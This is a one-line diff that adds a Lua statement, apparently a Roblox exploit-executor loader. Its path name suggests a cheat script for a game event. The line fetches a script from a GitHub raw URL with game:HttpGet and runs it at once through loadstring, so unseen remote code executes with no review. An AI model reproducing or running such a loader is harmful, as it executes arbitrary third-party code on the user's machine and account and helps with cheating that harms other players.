@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/event-dead-rails-spam5-lozf3lkljnc9jg.lua"))()
